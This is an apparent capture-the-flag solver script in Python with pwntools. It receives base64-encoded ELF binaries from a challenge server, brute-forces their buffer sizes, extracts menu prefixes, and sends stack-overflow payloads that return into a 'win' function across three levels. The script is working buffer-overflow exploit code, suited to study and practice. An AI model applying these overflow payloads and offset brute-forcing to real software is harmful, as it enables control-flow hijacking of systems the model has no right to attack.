# So, on every level, this shit send us an elf file in base64 (5 or 10 times). 
# We need to find payload which can call function win (which exit code is 66). 
# So menu values i read from file and easily bypass it. 
# Buffer length o found by brute forcing (run file and send payload with different size (from 0 to 600) and look at exit code).
# On 3 level it crushes sometimes, so you need some luck=)


from pwn import *
import base64
import os


def brute_buffer(filename):
    for i in range(0, 600):
        lvl1 = process(filename)
        
        lvl1.sendline(b'A' * i + p64(0x4011f6))
        lvl1.recv()
        lvl1.close()
        exit_code = lvl1.poll()
        if exit_code == 66:
            print(f'---------------------------------------------------------------------- BUFFER 1 SIZE: {i} ----------------------------------------------------------------------')
            return i


def brute_buffer_2(filename, prefix0, prefix1):
    for i in range(0, 600):
        #print(i, prefix0, prefix1)
        lvl2 = process(filename)
        lvl2.sendline(prefix0)
        lvl2.sendline(prefix1)
        lvl2.sendline(b'a' * i + p64(0x401216))
        sleep(0.005)
        
        exit_code = lvl2.poll()
        lvl2.close()
        if exit_code == 66:
            print(f'****************************************************** BUFFER 2 SIZE: {i} ******************************************************')
            return i


def brute_buffer_3(filename, prefix):
    for i in range(0, 600):
        print(i, prefix)
        lvl3 = process(filename)
        lvl3.sendline(prefix + b'a' * i + p64(0x401216))
        sleep(0.005)
        
        exit_code = lvl3.poll()
        lvl3.close()
        if exit_code == 66:
            print(f'****************************************************** BUFFER 3 SIZE: {i} ******************************************************')
            return i


p = remote('pwn.dvc.tf', 8890)
context.arch = 'amd64'


print('****************************************************** LVL1 ******************************************************')
LVL1_FILENAME = './dec64'

for _ in range(5):
    b64 = p.recvuntil(b'=').replace(b'\n', b'')
    with open(LVL1_FILENAME, 'wb') as f:
        f.write(base64.b64decode(b64))

    os.system(f'chmod +x {LVL1_FILENAME}')
    buffer_size = brute_buffer(LVL1_FILENAME)
    p.sendline(b'A' * buffer_size + p64(0x4011f6))
    print(p.recv())
    print(p.recv())


print('****************************************************** LVL2 ******************************************************')
LVL2_FILENAME = './dec64_2'

for _ in range(5):
    b64 = p.recvuntil(b'==').replace(b'\n', b'')
    with open(LVL2_FILENAME, 'wb') as f:
        f.write(base64.b64decode(b64))

    os.system(f'chmod +x {LVL2_FILENAME}')

    dec_bin = ELF(LVL2_FILENAME)

    with open(LVL2_FILENAME, 'rb') as f:
        text_bin = f.read()

    main_offset = dec_bin.symbols['main'] - 0x400000
    prefix0_offset = main_offset + 76
    pref0 = chr(text_bin[prefix0_offset]).encode()
    print(pref0)

    submenu_offset = dec_bin.symbols['submenu'] - 0x400000
    prefix1_offset = submenu_offset + 56
    pref1 = chr(text_bin[prefix1_offset]).encode()
    print(pref1)

    buffer_size = brute_buffer_2(LVL2_FILENAME, pref0, pref1)

    p.sendline(pref0)
    p.sendline(pref1)
    p.sendline(b'a' * buffer_size + p64(0x401216))

    print(p.recv())
    print(p.recv())


print('****************************************************** LVL3 ******************************************************')
LVL3_FILENAME = './dec64_3'

for _ in range(10):
    b64 = p.recvuntil(b'==').replace(b'\n', b'')
    with open(LVL3_FILENAME, 'wb') as f:
        f.write(base64.b64decode(b64))

    os.system(f'chmod +x {LVL3_FILENAME}')
    dec_bin = ELF(LVL3_FILENAME)

    with open(LVL3_FILENAME, 'rb') as f:
        text_bin = f.read()

    main_offset = dec_bin.symbols['main'] - 0x400000
    prefix0_offset = main_offset + 78
    pref0 = text_bin[prefix0_offset:prefix0_offset+8]
    print(hex(u64(pref0)))

    submenu_offset = dec_bin.symbols['submenu'] - 0x400000
    prefix1_offset = submenu_offset + 55
    pref1 = text_bin[prefix1_offset:prefix1_offset+8]
    print(hex(u64(pref1)))

    buffer_size = brute_buffer_3(LVL3_FILENAME, pref0 + pref1)

    p.sendline(pref0 + pref1 + b'a' * buffer_size + p64(0x401216))

    print(p.recv())
    print(p.recv())

print(p.recv()) # =)
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
